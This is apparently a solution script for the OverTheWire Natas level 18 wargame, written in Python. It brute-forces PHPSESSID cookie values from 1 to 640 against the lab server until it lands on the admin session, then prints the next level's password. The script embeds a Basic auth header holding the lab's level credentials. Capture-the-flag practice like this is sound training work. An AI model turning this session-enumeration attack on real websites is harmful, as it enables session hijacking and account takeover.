

import requests
import re

for i in range(1, 640+1):
    phpsessid = str(i)
    print("Attempting PHPSESSID: " + phpsessid)
    r = requests.get(
        'http://natas18.natas.labs.overthewire.org/index.php',
        headers={
            'Host' :'natas18.natas.labs.overthewire.org',
            'Authorization' : 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
            'Referer' : 'http://natas18.natas.labs.overthewire.org/'
        },
        cookies={
            'PHPSESSID' : phpsessid
        },
        proxies={
            'http' : '127.0.0.1:8090',
            'https' : '127.0.0.1:8090'
        }
    )

    if "You are an admin." in r.text:
        match = re.search(r'^Password: ([a-zA-Z0-9]+)</pre>.*', r.text, re.MULTILINE)
        if match:
            print('PHPSESSID ' + phpsessid + ' corresponds to user "admin"')
            print("")
            print("Credentials for Natas level19")
            print("UN: natas19")
            print("PW: " + match.groups()[0])
            print("")
        break

